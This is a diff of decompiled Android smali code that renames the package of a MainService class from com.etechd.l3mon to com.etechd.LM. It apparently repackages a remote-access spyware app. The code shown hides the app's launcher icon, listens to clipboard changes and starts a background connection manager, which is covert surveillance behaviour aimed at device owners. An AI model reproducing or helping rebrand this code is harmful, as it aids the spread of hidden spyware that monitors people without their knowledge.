@@ -1,4 +1,4 @@
-.class public Lcom/etechd/l3mon/MainService;
+.class public Lcom/etechd/LM/MainService;
 .super Landroid/app/Service;
 .source "MainService.java"
 
@@ -22,7 +22,7 @@
     .locals 1
 
     .line 82
-    sget-object v0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;
+    sget-object v0, Lcom/etechd/LM/MainService;->contextOfApplication:Landroid/content/Context;
 
     return-object v0
 .end method
@@ -52,7 +52,7 @@
 
     invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
-    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V
+    invoke-virtual {p0, v0}, Lcom/etechd/LM/MainService;->sendBroadcast(Landroid/content/Intent;)V
 
     .line 78
     return-void
@@ -65,7 +65,7 @@
     .param p3, "paramInt2"    # I
 
     .line 39
-    invoke-virtual {p0}, Lcom/etechd/l3mon/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
+    invoke-virtual {p0}, Lcom/etechd/LM/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
 
     move-result-object v0
 
@@ -73,7 +73,7 @@
     .local v0, "pkg":Landroid/content/pm/PackageManager;
     new-instance v1, Landroid/content/ComponentName;
 
-    const-class v2, Lcom/etechd/l3mon/MainActivity;
+    const-class v2, Lcom/etechd/LM/MainActivity;
 
     invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
@@ -84,15 +84,15 @@
     invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
 
     .line 44
-    new-instance v1, Lcom/etechd/l3mon/MainService$1;
+    new-instance v1, Lcom/etechd/LM/MainService$1;
 
-    invoke-direct {v1, p0}, Lcom/etechd/l3mon/MainService$1;-><init>(Lcom/etechd/l3mon/MainService;)V
+    invoke-direct {v1, p0}, Lcom/etechd/LM/MainService$1;-><init>(Lcom/etechd/LM/MainService;)V
 
     .line 65
     .local v1, "mPrimaryChangeListener":Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;
     const-string v3, "clipboard"
 
-    invoke-virtual {p0, v3}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {p0, v3}, Lcom/etechd/LM/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v3
 
@@ -103,10 +103,10 @@
     invoke-virtual {v3, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V
 
     .line 69
-    sput-object p0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;
+    sput-object p0, Lcom/etechd/LM/MainService;->contextOfApplication:Landroid/content/Context;
 
     .line 70
-    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V
+    invoke-static {p0}, Lcom/etechd/LM/ConnectionManager;->startAsync(Landroid/content/Context;)V
 
     .line 71
     return v2
